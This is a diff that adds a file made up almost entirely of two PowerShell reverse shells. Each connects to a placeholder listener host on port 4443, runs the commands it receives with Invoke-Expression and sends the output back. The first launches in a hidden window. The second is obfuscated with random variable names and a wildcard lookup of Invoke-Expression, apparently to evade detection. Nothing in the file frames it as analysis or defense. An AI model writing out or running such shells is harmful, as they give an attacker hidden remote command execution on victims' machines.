@@ -1,0 +1,11 @@
+Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('listnerip',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden
+
+
+
+
+
+
+
+per
+
+ $c8cc043a1884464eab575db767957501 = New-Object System.Net.Sockets.TCPClient('listnerip',4443);$b20dc30597a24782a3c976c7a19d63f8 = $c8cc043a1884464eab575db767957501.GetStream();[byte[]]$4b901ff65f2040419ebd615ec54ea15f = 0..65535|%{0};while(($i = $b20dc30597a24782a3c976c7a19d63f8.Read($4b901ff65f2040419ebd615ec54ea15f, 0, $4b901ff65f2040419ebd615ec54ea15f.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($4b901ff65f2040419ebd615ec54ea15f,0, $i);$sendback = (&(gcm invok*-exp*) $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + $(gl) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$b20dc30597a24782a3c976c7a19d63f8.Write($sendbyte,0,$sendbyte.Length);$b20dc30597a24782a3c976c7a19d63f8.Flush()};$c8cc043a1884464eab575db767957501.Close()
